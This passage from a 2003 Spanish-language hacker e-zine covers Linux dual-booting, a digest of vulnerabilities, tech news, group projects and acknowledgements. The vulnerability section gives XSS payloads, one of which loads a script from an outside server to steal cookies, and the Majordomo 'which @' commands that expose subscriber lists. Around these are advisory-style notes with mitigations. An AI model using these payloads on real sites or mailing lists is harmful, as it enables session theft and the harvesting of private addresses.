cuenta esta  distribucion no es tan famosa entre usuarios comunes sino que es usada para 
entornos comerciales.
http://www.calderasystems.com

Existen mas distribuciones (como dije inicialmente) las cuales no son tan famosas pero
no es razon para no que investigues sobre ellas o las instales en tu tarrito esa es tu
propia decision.


3. Quiero Linux con Win en la misma maquina que hago???:
========================================================

Esta es la duda de algunos principiantes que quieren migrar a Linux pero tambien quieren 
tener Win, la respuesta es facil... Particionar el Disco Duro...

Particiones:  Esto es cuando tenemos un disco duro queremos partirlo en 2 por asi decirlo

Bueno partamos de la base que Win toma a cualquier S.O. como una amenaza (marketing) y en 
la maquina que queramos instalar Linux, Win no lo recibe con los brazos abiertos, bueno 
para esto solo tendremos que despedirnos de nuestro Win y de los mp3 y videos que tengamos
y los tratemos de guardarlos en algun cd u otra forma de salvar nuestra informacion.

Consideremos los siguientes pasos para instalar 2 S.O. o mas...

a. Instalar Win otra vez:  Si, para que nos surja efecto la instalacion de Linux tendremos
que hacer esto para asignar espacio en el D.D. de nuestro pc.  Cuando Instalamos Win en 
nos dice que tenemos un win y te pregunta si quieres borrar la particion de este, lo hacemos
y despues creamos una particion nueva, ejemplo: tenemos un D.D. de 10 gb y queremos dejar 
para Win 5 gb se lo asignamos,  siempre nos pide que lo pongamos en mb eso no es problema 
creo yo y el resto va para nuestro Linux obvio que la instalacion de Win no nos preguntara 
eso asi que dejamos que la instalacion de Win continue.

Despedida:
==========

Bueno eso ha sido todo por el momento, ya se que es poco pero piensen tengo cosillas que 
hacer y tengo que dejar espacio para que mis compañeros se desplayen hablando de otros temas 
pero prometo que para la otra entrega, les enseñare a instalar un RedHat 7.3 (aunque no es 
mucho trabajo pero es necesario para tengan su S.O. Linux) y la instalacion de un Slackware 
8.0 junto con enseñar a usar el fdisk herramienta para particionar discos.

Tarea: 
======

Lean sobre el tema visiten las paginas de las distribuciones y elijan una para 
instalar y si tienen dudas mi correo y el del team esta abierto para cualquier duda.

* alphaice@hotmail.com
* cdt_911@hotmail.com



11. Bug(s) y explois ========================================================================
By  Cultura Digital Team ====================================================================
=============================================================================================

Bueno damas y caballeros en esta seccion daremos a conocer los bug que estan causando 
un cierto furor en el mundo inet, asi como tambien no descartamos en un futuro venidero
descubrir uno que otro agujero de seguridad en algun sistema operativo, para esto se 
trabaja, y quizas quien sabe a lo mejor por ahi le damos una sorpresa en los numeros
venideros de esta magazine.

Estos bug(s) y exploit son recopilados por los diferentes paseos que hacen algunos de los
integrantes de CDT por paginas de seguridad informatica, ya dejemoslos de tanta burrada y
a presentar dichos bug(s) y exploit.


Vulneravilidad Cross Site Scripting (XSS):
==========================================

Es una vulnerabilidad muy comun en muchos servidores web, sobro todo en en aquellos que usan 
paginas dinamicas para generar el contenido. Que esta vulneravilidad sea comun no quire 
decir que no sea importante. Ahora veamos un ejemplo.
Supongamos que encontramos una url como esta:

http://afectado/error.asp?msg=Error+en+los+datos

Dicha url los muestra una pagina con un mensaje de error en el centro ("error en los datos").
El problema esta en que el atacante tiene la posivilidad de introducir cualquier mensaje en 
esa pagina por ejemplo "conan estubo aqui". lo que es mas peor aun esque se puede o se podria
inyectar codigo JavaScript en la pagina usando una URL como esta:

http://afectado/error.asp?msg=<script>alert('conan');</script>

Tambien existe la posibilidad de inyectar scripts mas complejos usando el atributo "src" de 
la etiqueta <script></script>, por ejemplo, <script src="http://cliente/script.js"></script>. 
Este atributo nos permite cargar scripts largos y complejos desde otros servidores.

Esto permitiria robar una cookies, secuetrar sesiones o falsificar las paginas de inicio 
de sesion.

servicio KCMS de Solaris permite el acceso a cualquier archivo:
===============================================================

Un atacante puede acceder a cualquier archivo existente en una maquina Solaris donde se 
se ejecute el daemon kcms_server. 

KCMS ("Kodak Color Management System") es un conjunto de funciones, incorporadas en el sistema
operativo Solaris, que mejoran la apariencia y ofrecen una reproduccion adecuada de las 
imagenes digitales a color obteniendo las maximas prestaciones tanto de los ordenadores como 
de los dispositivos asociados. Las funciones de esta biblioteca realizan las manipulaciones y 
correcciones de color necesarias. 

kcms_server es un daemon que permite a la biblioteca KCMS acceder a los perfiles almacenados 
en maquinas remotas. Estos perfiles se encuentran almacenados en los directorios 
/etc/openwin/devdata/profiles y /usr/openwin/etc/devdata/profiles. 

Existe una vulnerabilidad de escalada de directorios en la funcion KCS_OPEN_PROFILE que puede 
ser utilizada para acceder a cualquier archivo existente en un sistema remoto vulnerable. 
Dado que el kcms_server se ejecuta con privilegios de root, esta vulnerabilidad permite a un 
atacante acceder a cualquier archivo de un sistema vulnerable. 

Esta vulnerabilidad afecta a todas las versiones de Solaris posteriores a la 2.5.1 y hasta la 
versión 9 (incluida) en las plataformas Sparc e Intel. 

Para determinar si una maquina Solaris ejecuta este kcms_server, puede ejecutarse el siguiente 
mandato: 

$ ps -ef ¦ grep kcms_server 

root 484 156 0 15:12:01 ? 0:00 kcms_server 

Si lo que desea es determinar el puerto tcp utilizado por el demonio, es preciso utilizar el 
programa rpcinfo: 

$ rpcinfo -p ¦ grep 100221
100221 1 tcp 32781 

$ netstat -a ¦ grep 32781 

*.32781 Idle
*.32781 *.* 0 0 24576 0 LISTEN 

En este caso, el servicio esta operativo y asociado al puerto 32781/tcp 
asta el momento en que Sun facilite el parche que elimine esta vulnerabilidad, se aconseja 
deshabilitar el servicio kcms_server. Para ello es preciso editar el archivo /etc/inetd.conf 
y comentar la linea 

#
# Sun KCMS Profile Server
#
100221/1 tli rpc/tcp wait root /usr/openwin/bin/kcms_server kcms_server 

y reiniciar inetd. Si esto no es posible, como minimo deben configurarse las medidas de 
proteccion perimetrales para impedir la utilización del servicio desde redes inseguras, como 
puede ser Internet. 

Fuente hispacec.


Revelacion de información en Majordomo:
========================================

Existe una vulnerabilidad en Majordomo que permite la obtención de los suscriptores de las 
listas de correo, incluso cuando por configuracion no se permite realizar esta operacion.

Majordomo es un programa para la administracion de las listas de discusion que realiza las 
tareas de administracion (alta y baja de suscriptores de la lista), asi como el envio de 
los mensajes y los parametros de distribución de los mensajes: listas moderadas, 
distribucion de mensajes en modalidad digest, etc.  

Hasta hace poco tiempo era el software de listas de correo mas popular en los entornos Unix, 
pero ultimamente esta siendo sustituido por otros programas mas modernos que, por ejemplo, 
permite al usuario administrar las suscripciones a traves de una interfaz web. No obstante, 
existen todavia multiples listas de distribucion que son controladas por Majordomo. 

Por defecto, Majordomo permite a cualquier persona obtener la lista de direcciones suscritas 
a la lista enviando un mensaje con la orden "WHO [nombre_lista]" a Majordomo. No obstante, 
para proteger la privacidad de los suscriptores y evitar la recoleccion de direcciones para 
el envio de spam, generalmente en la configuración de la lista se restringe el acceso a esta 
relacion a los suscriptores de la lista o, más habitualmente, a únicamente el administrador. 

Se ha descubierto la existencia de una vulnerabilidad que puede ser utilizada para obtener 
la relacion de suscriptores, incluso cuando por configuracion se ha deshabilitado la orden 
WHO.

Si en la configuracion de la lista se mantiene la posibilidad de utilizar la orden "WHICH" 
(y por defecto, esta opcion esta activa) cualquier persona puede obtener la relacion de 
suscriptores en las diversas listas existentes enviando un mensaje que contenga cualquiera 
de estas dos ordenes: 

which @
which . 

Para hacer uso de esta vulnerabilidad no es preciso estar suscrito a ninguna de las listas 
existentes en el servidor atacado. Esta vulnerabilidad afecta a todas las versiones 
existentes de Majordomo, incluyendo las versiones alpha de Majordomo 2. 

Para evitar el robo de la lista de suscriptores, se aconseja revisar la configuracion de 
todas las listas y en aquellas donde este habilitada la orden WHICH, esta deberia 
deshabilitarse. Alternativamente, se ha publicado un parche para el codigo fuente de 
Majordomo 1.9.5: 

--- majordomo.orig Mon Feb 3 13:23:45 2003
+++ majordomo Mon Feb 3 13:23:23 2003
@@ -624,6 +624,11 @@

sub do_which {
local($subscriber) = join(" ", @_) ¦¦ &valid_addr($reply_to);
+ if ($subscriber !~
/^[0-9a-zA-Z\.\-\_]+\@[0-9a-zA-Z\.\-]+\.[a-zA-Z]{2,3}$/) {
+
+ &log("which abuse -> $subscriber passed as an argument.");
+ exit(0);
+ };
local($count, $per_list_hits) = 0;
# Tell the requestor which lists they are on by reading through all
# the lists, comparing their address to each address from each list

Una vez aplicado este parche, Majordomo ignorara cualquier orden WHICH que no contenga como 
parametro una dirección de correo electronico. WHICH se utiliza para determinar las listas 
de correo a las en las que esta suscrita una direccion de correo electronico. 

Fuente: hispasec.


Graves vulnerabilidades en CUPS:
================================

Las versiones de CUPS no actualizadas contienen numerosas vulnerabilidades que permiten matar 
el servidor, sobreescribir ficheros arbitrarios en la maquina y obtener privilegios 
adicionales como los usuarios "root" y "lp". 

CUPS ("Common Unix Printing System") es un sistema de impresion en red de entornos UNIX, 
basado en el primitivo IPP ("Internet Printing Protocol"). Actualmente se esta perfilando 
como un estandar "de facto", permitiendo la impresion remota en impresoras "raster" y 
ostScript, a traves de una red de datos, y de forma multiplataforma. CUPS esta soportado por 
numerosos fabricantes, aparte de los distribuidores habituales de Linux y *BSD, notablemente 
Apple en su Mac OS X. 

Las versiones de CUPS no actualizadas permiten que un atacante remoto logre, en el peor de 
los casos, acceso al servidor con privilegios de administrador o root.

Las vulnerabilidades detectadas son: 


1) Varios desbordamientos aritmeticos: Permiten obtener privilegios de usuario "lp", del 
   grupo sys, tipicamente. 

2) "Race condition" en "/etc/cups/certs/": Esta vulnerabilidad permite que un usuario del 
    sistema sobreescriba cualquier archivo del mismo con privilegios de administrador o root.

3) Enviar peticiones CUPS incorrectas puede matar el servidor, provocando un ataque DoS.

4) Error de diseño del mecanismo para añadir impresoras de forma remota: CUPS permite añadir 
   impresoras de forma remota, enviando al servidor un datagrama UDP apropiado. Un atacante 
   malicioso puede enviar un nombre de impresora especialmente formateado que, al 
   seleccionarla, desencadene varios bugs que le permitan obtener privilegios adicionales. 
   Dado que la Unica manera de eliminar esa impresora es seleccionándola en la interfaz 
   grafica, el ataque tiene exito.

5) Desbordamientos de bufer varios que pueden lograr privilegios de administrador o root 
   para el atacante.   
  
6) Perdida de descriptores de fichero: Ante determinadas peticiones, CUPS puede perder un 
   descriptor de fichero. Dado que el numero de descriptores que un proceso puede mantener 
   abiertos es un recurso limitado, un ataque continuado puede provocar un DoS sobre el 
   ervidor CUPS. 

Se recomienda que todas las instalaciones de CUPS actualicen cuanto antes a la version 
1.1.18. Si ello no es posible, deben filtrar el acceso al demonio CUPS en los routers o 
cortafuegos, para reducir el riesgo de un ataque externo. En todo caso, la mayoria de los 
fabricantes, incluido Apple, ya han publicado actualizaciones. 



12. Noticias del mundo underground chile y el mundo =========================================
By  Cultura Digital Team ====================================================================
=============================================================================================

Bueno para relajar la vista y la neura un rato,  aca les dejamos algunas noticas del mundo 
del espectaculo jeje para que lean y se informen de lo que a pasado o de lo que esta 
pasando en el mundo under.


Vulnerabilidad en servicio Localizador de diferentes sistemas Windows:
======================================================================

Para variar  el tio bill y sus bug :-) Microsoft ha anunciado la existencia de una 
vulnerabilidad en el servicio Localizador presente en Windows NT 4.0, Windows 2000 y 
Windows XP por la cual un atacante podria llegar a ejecutar codigo en los sistemas
afectados. 

El servicio Localizador (Locator) de Microsoft es un servicio de nombres que mapea 
nombres logicos a nombres especificos de red. Este se incluye con Windows NT 4.0, Windows 
2000 y Windows XP. Por defecto, el servicio Locator esta activo solo en controladores de 
dominio Windows 2000 y controladores de dominio Windows NT 4.0; no esta activo en 
estaciones de trabajo Windows NT 4.0 o servidores miembros, estaciones de trabajo Windows 
2000 o servidores miembros, o Windows XP. 

Se produce una vulnerabilidad de seguridad de un bufer sin comprobar en el servicio 
Locator. Mediante el envio de una peticion mal construida al servicio Locator, un atacante 
puede provocar la caida del servicio, o incluso la ejecucion de codigo en el sistema. Un 
atacante podra explotar la vulnerabilidad construyendo una llamada RPC que haga uso del 
servicio Locator para resolver un nombre logico, y usando la llamada RPC para pasar los 
datos mal construidos.


Mitnick vuelve a red: 
=====================

Si tal como lo leen despues de haber pasado cuatro años en la carcel y cuatro mas con 
prohibicion de tocar un computador, uno de los hackers mas famosos del planeta volvio
a navegar en la red, Mitnick se mostro contento e entusiasmado de conocer las nuevas
tecnologias que no habia podido usar por la famosa prohibicion. Declaro a CNN "Estoy 
ansioso por usar el correo electronico. Mis amigos y familiares ya estan cansados de 
revisar mis casillas de correo  y tener que imprimir mis mensajes", señalo el hombre 
que en la actualidad tiene 39 años y que fue el hacker mas buscado durante tres años
por el FBI.

Mitnick tambien digo que estaba listo para buscar trabajo en alguna empresa que lo
quisiese contratar para asi combatir a los que alguna ves fueron sus colegas ( los 
hackers).

El apodado el chacal de la red señalo "dentro de todas las cosas que no ha podido hacer 
con el computador lamento haber perdido tanto tiempo de investigación y aprendizaje. 
Tambien el castigo cibernautico por decirlo menos le sigue prohibiendo que saque o que
lucre con sus historia hasta el 2010.


Rusia, primer pais en ver el codigo fuente de Windows: 
======================================================

La compañia de bill informo que rusia sera el primer pais en ver el codigo fuente  de el 
sistema operativo Windows. Bajo un programa de la compañia denominado Government Security 
Program (Programa de Seguridad del Gobierno). 

Los paises que tendran el codigo no podran modificarlo, pero si utilizar la informacion 
para ayudar en problemas de seguridad y hacer seguras las propias que corren bajo 
WIndows.

Rusia recibira la primera parte de las 30 millones de lineas de codigo a comienzos de 
febrero. Los paises en la alianza de defensa NATO podrian ser los siguientes en recibir 
el codigo dicho. 


Acceso a cualquier archivo a traves de plantillas en ColdFusion MX: 
===================================================================

Se ha anunciado la existencia de una vulnerabilidad en ColdFusion MX Enterprise Edition 
a traves de la cual un usuario puede conseguir acceso no autorizado a cualquier archivo 
del sistema. 

El problema reside en las etiquetas cfinclude y cfmodule de ColdFusion MX, ya que estas 
aceptan nombres de archivos con rutas relativas como argumento. El servidor no realiza 
la comprobacion de la configuracion de permisos en el Sandbox Security Files/Dirs de 
forma previa a la inclusion de los archivos mediante esas etiquetas. Esto permite a una 
plantilla acceder a datos no autorizados mediante su uso. 

Para evitar este problema se recomienda instalar el parche publicado por Macromedia 

Este parche debera instalarse en el directorio {cf_root}/runtime/servers/lib (en 
versiones Unix) o en {cf_root}\runtime\servers\lib (en versiones Windows). Por ultimo 
debera reiniciarse el servidor ColdFusion MX. 


Un navegador cuatriplica la velocidad en Internet: 
==================================================

Un navegador de Internet que alcanza una velocidad al menos cuatro veces mayor que 
cualquier otro ha ganado el maximo galardon en una exhibicion para jovenes cientificos 
que tuvo lugar en Irlanda, segun informo AFP. 

Adnan Osmani, 16, un estudiante de Saint Finian's College, en Mullingar (centro de 
Irlanda), tardo 18 meses en escribir 780.000 lineas del codigo que usan los ordenadores 
para desarrollar el navegador. Conocido como 'XWEBS', el sistema funciona con una 
conexion a Internet normal, utilizando un modem de 56K. 

Los cientificos del University College de Dublin probaron este software la semana 
pasada y encontraron que aumentaba la velocidad de navegacion entre el 100 y el 500%, 
segun la conexion disponible. Adnan admite que es capaz de lograr velocidades seis veces
mayores como maximo. "Elevando la velocidad siete veces mas se estropea, asi que la he 
limitado a seis". Otras ventajas de este navegador es que permite acceder a 120 
motores de busqueda, y cuenta con reproductores de musica y video. 

Es el primer navegador del mundo que incorpora una barra de tareas para DVD, asi que 
puedes ver un DVD en cualquier tipo de pantalla y navegar por Internet al mismo tiempo.



13. Proyectos CDT ===========================================================================
By  Cultura Digital Team ====================================================================
=============================================================================================

En esta seccion le daremos a conocer los proyectos que tenemos proyectados ir concretando
en un par de meses mas si es que el tiempo nos alcanza ya que casi todos los miembros de 
CDT estudian unos de en U y otros todavia en el colegio, pero igual trataremos de 
hacernos el tiempo debido para darle curso a estos proyectos, bueno ahora les paso a 
presentar lo que tenemos en mente...


1. proyecto de Laboratorio de sistemas informaticos:
====================================================

Bueno este proyecto tiene la finalidad de conocer un sistema operativo a fondo ya sea 
unix y sus derivados como linux o  solaris asi como tambien de la familia del tio bill 
como los son win 2000 server, WinNT, etc. proyecto se llama laboratorio de sistemas 
informaticos porque vamos a experimentar con ratas de laboratorio jeje no mentira de 
llama asi porque aca nos  vamos a encerrar para conocer un sitema informatico para asi 
darselo a conocer a todos.


2. Charlas CDT:
===============

Aca en este otro proyecto que trataremos de implementar en este mes ahora en febrero y
despues iremos extendiendo cada mes para dar charlar sobre seguridad, programacion (c,
visual, en shell de unix). Tambien algunas charlas sobre redes, servidores y por supuesto 
no podian estar ausente las charlas de hacking :-), estas charlas las implantaremos en 
el canal #cdt en el server irc.cl, los horarios y las fechas todavia no las tenemos muy 
claras, pero le confirmamos poniendo algun aviso en nuestra web asi que si quieren 
participar de estas charlas solo tienen que estar pendiende en la la red y contactarse 
con nosotros.

Bueno esos son los proyectos que concretaremos pronto y ende valla pasando el tiempo lo
veran. Tambien tenemos otros proyectos en mente o en carpeta esperando ser sacados a la 
luz pero eso lo dejamos para otra ocacion.



14. Agradecimientos =========================================================================
By  Editor Cultura Digital Team =============================================================
=============================================================================================

Aca se viene la parte de los agradecimientos hmmm haber voy a empezar por mis viejos 
jeje que si no me hubieran hecho esa noche, esto quizas no hubiera estado nunca aca 
jeje especialmente a mi viejo que me regalo mi primer pc hace ya años y gracias a 
ello descubri este maravilloso mundo que me cautivo y que gamas dejare :P, haber a 
quien le toca ahora jeje voy a empezar por _Alphaice_ ( yerko) grax cumpa por ser la 
persona que eres, aparte de un gran compañero de U una gran persona y esto tambien sin 
ti no hubiera sido posible ya que tu me apoyaste desde el primer momento osea desde la 
cuna del proyecto CDT como olvidar esa mañana en la cual salio todo de mi mente y que 
le dimos rienda suelta y camino a este proyecto grax yerko gran valor. hmmm haber ahora 
es el turno de el nacho23 ups man te acuerdas cuando te dije "oye man sabes tenemos un 
proyecto quieres saber de que se trata todo esto" y tu me respondiste si demas ejale 
fuiste el primero en integrarte al team y has apoyado en todo de cierta manera y tambien 
has criticado constructivamente para asi ir creciendo como grupo, ojala sigamos por mucho 
mas integrando el grupo y que veamos los avances de CDT. Ahora es el turno del Bitburner 
o Blackconcept jeje hmmm muy buen chato el hombre un 7 se a preocupado caleta por los 
proyectos del grupo, ademas el man sin haberle preguntado nada se mando el diseño de la 
web que por lo demas esta muy buena,  grax mano gran valor :P. Sigamos hmmm el 
turno del que menos conozco jeje el yuy0x pero por lo poco que te conozco creo que eres 
una gran persona y con un fin comun con todos nosotros, en este tiempo que viene entrare 
a conocerte mejor y ya sabes = las gracias por apoyar todo esto y esperamos que 
contribuyas en los proximos numeros trotamundo yuy0x jeje grax. y el turno del nuevo 
integrante de CDT Nec gracias man tambien por apoyar esto y ojala que tambien dures 
mucho tiempo entre las filas y asi con el pasar del tiempo tambien como le decia a yuy0x 
conocernos mas y formar un grupo unido con espiritu, ganas, trabajo y conocimiento el 
resto vendra con el tiempo grax  Nec.

Ahora viene el turno de algunos tambien que desinteresadamente los han tendido una mano
y a otros que tambien los inspiran a seguir adelante, bueno espesemos por hacerle la pata
a proyecto R jeje no grax a ustedes son una gran fuente de inspiracion para los demas
y todo lo que hacen es genial y a su founder un saludo especial “Plaxius” saludos desde 
este humilde grupo de personas especialmente de mi conan. otro agradecimiento que tambien
no podia quedar fuera es el de zine-store espicialmente a "Mau" por la contribucion que 
haces al reunir la mayoria de las e-zine hispano parlantes y grax por haber confiado en 
nosotros y difundir en zine-store nuestra magazine. Otro agradecimiento  otro meta 
agradecer estamos nomas jeje bueno como decia otro agradecimiento tambien a "MoonSpell" 
por tambien de una forma haber apoyado esto y quizas sea el proximo integrante del staff 
de CDT como una primicia jeje grax man y estan pendientes las chelas jeje.

Yasp hemos terminado la larga lista de agradecimientos jeje ups muchos jeje pero igual 
valia la pena darles el agradecimiento especialmente a los miembros que componen CDT 
porque como decia aca empieza un camino y con el tiempo veremos nuestra evolucion en el 
tiempo y se a terminado la seccion de agradecimientos bye....



15. Despedida ===============================================================================
By  Editor Cultura Digital Team =============================================================
=============================================================================================

Y aca estamos en el final, como todas las cosas se terminan y esta no es la acepcion 
aca terminamos con nuestra primer entrega, ojala alla sido de su agrado todo lo que 
en este numero de esta magazine expusimos. Trataremos con el pasar de los numeros como 
lo decia ir mejorando esto cada vez mas para asi ir dandole a conocer el mundo under 
a traves de este grupo de personas que representan Cultura Digital Team. Tenemos la 
esperanza, ganas y un poco de conocimiento para seguir adelante en esto, para nosotros 
aca empieza nuestro caminar ojala que por el camino no los perdamos y perduremos en el 
tiempo y dejemos una huella en tal preciado camino para unos que es la informatica. 
No buscamos imponer la cultura digital solo buscamos difundirla y darla a conocer a 
todo el mundo hispano parlante y porque no en un futuro no tan lejano a todo el 
mundo.

Bueno esto han sido meses de arduo trabajo para unos y estudios para otros, tambien 
vacaciones para los que tienen suerte jeje. Esperamos que con nuestro trabajo 
contribuyamos al menos con un granito de arena humildemente para dar a conocer la 
cultura que nos mueve y lo que dedicamos esta magazine, el underground.
 
Para ir terminando con nuestro primer numero esperamos que el proximo numero ("1) salga 
dentro de unos meses y colaboren todos los miembros del staff porque aca todo se basa 
en trabajo y entrega por un fin comun, tambien estan abiertas las puertas a la gente que 
quiera de una u otra manera colaborar con nosotros ya saben donde encontrarnos y 
comunicarnos y bueno esto a terminado, pronto vendremos con nuestro siguiente numero 
byex a todos y que esten bien.



:::::::::::::::::::::::::::::::::::::::: The Hend ::::::::::::::::::::::::::::::::::::::::::
					   
					   

				         
		   Todos los derechos reservados Cultura Digital Team  2003
				     esa honda :::::::::P



 


EOF